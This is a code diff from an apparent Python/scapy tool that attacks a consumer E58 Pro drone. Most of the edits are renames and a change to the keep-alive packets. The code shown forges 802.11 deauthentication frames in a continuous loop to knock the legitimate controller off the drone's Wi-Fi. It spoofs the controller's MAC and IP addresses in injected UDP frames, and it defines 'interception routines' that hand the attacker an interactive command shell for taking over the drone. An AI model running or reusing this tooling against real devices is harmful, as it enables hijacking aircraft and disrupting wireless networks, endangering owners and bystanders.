@@ -8,12 +8,12 @@ from scapy.packet import Packet
 from scapy.sendrecv import sendp, send
 from threading import Thread, Event
 
-from e58pro.packet_structures import new_default_command_payload, new_keep_alive_payload, E58ProHeader, E58ProSecondaryHeader, E58ProBasePayload
+from e58pro.command_payloads import new_default_command_payload, new_video_ack, E58ProHeader, E58ProSecondaryHeader, E58ProBasePayload
 
 from e58pro.address_results import AddressResults
 
 from interactive_shell.interactive_shell import InteractiveShell
-from e58pro.commands import produce_commands
+from e58pro.shell_commands import produce_commands
 
 
 #INTERFACE = "wlx4401bb9182b7"
@@ -34,12 +34,12 @@ UDP_SRC_PORT = 49092  # Arbitrary. Will be where video is sent back?
 UDP_DST_PORT = 8800
 
 
-def udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
+def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
     return IP(src=controller_ip, dst=drone_ip) / \
            UDP(sport=UDP_SRC_PORT, dport=UDP_DST_PORT)
 
 
-def dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
+def _dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
     return RadioTap(present="Rate+TXFlags") / \
            Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
            Dot11QoS() / \
@@ -47,15 +47,17 @@ def dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
            SNAP()
 
 
+# FIXME: Will need to sniff for the current ack number using _scan_for_current_video_ack in auto_pwn
+#  Combine autopwn and this file since it's not clear what should go where. They're very similar.
 def _start_udp_keep_alive(interface_name: str, is_terminating: Event, l4_base: Packet, sender_func: Callable) -> None:
     def keep_alive_loop():
-        comm_keep_alive = l4_base / new_default_command_payload()
-        video_keep_alive = l4_base / new_keep_alive_payload()
+        #comm_keep_alive = l4_base / new_default_command_payload()
+        video_keep_alive = l4_base / new_video_ack(0)
 
         seq_n = 0
         while not is_terminating.is_set():
             video_keep_alive[E58ProBasePayload].sequence_number = seq_n
-            sender_func(comm_keep_alive, iface=interface_name, verbose=False)
+            #sender_func(comm_keep_alive, iface=interface_name, verbose=False)
             sender_func(video_keep_alive, iface=interface_name, verbose=False)
             seq_n += 1
             sleep(0.05)
@@ -89,12 +91,12 @@ def _interactive_shell_common(interface_name: str, l4_base: Packet, sender_func:
         keep_alive_termination_event.set()
 
 
-def new_sequence_control(frag: int, seq: int) -> int:
+def _new_sequence_control(frag: int, seq: int) -> int:
     return (seq << 4) + frag
 
 
 def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Deauth:
-    sc = new_sequence_control(0, seq_num)
+    sc = _new_sequence_control(0, seq_num)
     # TODO: Why is the RadioTap header with those present flags necessary?
     return RadioTap(present="Rate+TXFlags") / \
            Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
@@ -106,7 +108,7 @@ def _start_deauther(interface_name: str, is_terminating: Event, deauth: Packet) 
         seq = 0
         while not is_terminating.set():
             sendp(deauth, iface=interface_name, verbose=False)
-            deauth[Dot11].SC = new_sequence_control(0, seq)
+            deauth[Dot11].SC = _new_sequence_control(0, seq)
             seq += 1
             sleep(0.5)
     thread = Thread(target=deauth_loop)
@@ -114,8 +116,8 @@ def _start_deauther(interface_name: str, is_terminating: Event, deauth: Packet) 
 
 
 def connectionless_interception_routine(interface_name: str, addrs: AddressResults):
-    layer_2 = dot11_data_layer(addrs.drone_mac, addrs.controller_mac)
-    layers_3_4 = udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
+    layer_2 = _dot11_data_layer(addrs.drone_mac, addrs.controller_mac)
+    layers_3_4 = _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
 
     deauth = new_deauth(addrs.controller_mac, addrs.drone_mac, addrs.drone_mac, 1, DEAUTH_REASON)
     deauth_terminating = Event()
@@ -131,6 +133,6 @@ def connectionless_interception_routine(interface_name: str, addrs: AddressResul
 def connected_interception_routine(interface_name: str, drone_ip: str, controller_ip: str) -> None:
     """To be run after the drone and the controller have been identified.
     Used when you're actually connected to the drone's network."""
-    layers_3_4 = udp_layer_3_4(drone_ip, controller_ip)
+    layers_3_4 = _udp_layer_3_4(drone_ip, controller_ip)
     _interactive_shell_common(interface_name, layers_3_4, send)
 
